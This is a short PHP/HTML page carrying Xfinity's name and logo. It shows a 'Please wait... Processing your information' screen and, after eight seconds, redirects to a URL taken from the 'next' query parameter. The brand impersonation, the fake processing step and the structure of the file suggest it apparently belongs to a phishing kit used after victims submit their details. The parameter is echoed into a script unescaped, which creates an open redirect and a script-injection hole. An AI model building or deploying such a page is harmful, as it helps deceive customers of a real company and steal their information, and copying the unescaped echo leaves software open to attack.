<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>xfinity</title>
  <link rel="stylesheet" href="res/wait.css">
  <style>
    /* Force Trebuchet MS font globally */
    body, header, main, .logo, .coun, .title, h2, p, .load, div, span {
      font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Segoe UI', sans-serif !important;
    }
    /* Optional: preserve original spacing and no extra styling changes */
    .title h2 {
      font-weight: 600;
    }
    .title p {
      font-weight: normal;
    }
  </style>
</head>
<body>
<header>
    <div class="logo">
        <img src="res/img/logo.png" alt="xfinity">
    </div>
</header>
<main>
    <div class="coun">
        <div class="title">
            <h2>Please wait...</h2>
            <p>Processing your information...</p>
        </div>
        <div class="load">
            <img src="res/img/loading.gif" alt="loading">
        </div>
    </div>
</main>
<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location = next;
}, 8000);
</script> 
</body>
</html>